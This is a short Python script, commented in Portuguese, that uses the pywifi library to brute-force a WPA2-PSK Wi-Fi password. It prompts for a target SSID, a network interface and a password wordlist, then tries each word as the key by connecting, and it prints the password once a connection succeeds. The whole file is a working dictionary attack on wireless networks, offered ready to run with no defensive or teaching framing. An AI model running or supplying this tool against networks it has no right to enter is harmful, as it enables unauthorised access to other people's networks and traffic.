from pywifi import PyWiFi, const, Profile
import time

def brute_force_wifi(ssid, interface, dictionary_path):
    wifi = PyWiFi()
    iface = wifi.interfaces()[interface]  # Seleciona a interface de rede

    iface.disconnect()  # Desconecta de qualquer rede Wi-Fi
    time.sleep(1)  # Espera por 1 segundo para garantir que a desconexão ocorreu

    profile = Profile()  # Cria um perfil de rede
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    with open(dictionary_path, 'r') as dictionary:
        for password in dictionary:
            password = password.strip()
            profile.key = password
            iface.remove_all_network_profiles()  # Remove perfis antigos
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)  # Tenta conectar
            time.sleep(2)  # Espera 2 segundos para verificar se a conexão foi bem-sucedida

            if iface.status() == const.IFACE_CONNECTED:
                print(f"Senha encontrada: {password}")
                iface.disconnect()
                return password
            else:
                print(f"Falha ao conectar com a senha: {password}")

    print("Senha não encontrada.")
    return None

if __name__ == "__main__":
    ssid = input("Digite o SSID da rede Wi-Fi: ")
    interface_number = int(input("Digite o número da interface de rede (geralmente 0 ou 1): "))
    dictionary_path = input("Digite o caminho para o arquivo de dicionário de senhas: ")

    password = brute_force_wifi(ssid, interface_number, dictionary_path)
    if password:
        print(f"A senha correta é: {password}")
    else:
        print("Não foi possível encontrar a senha com o dicionário fornecido.")
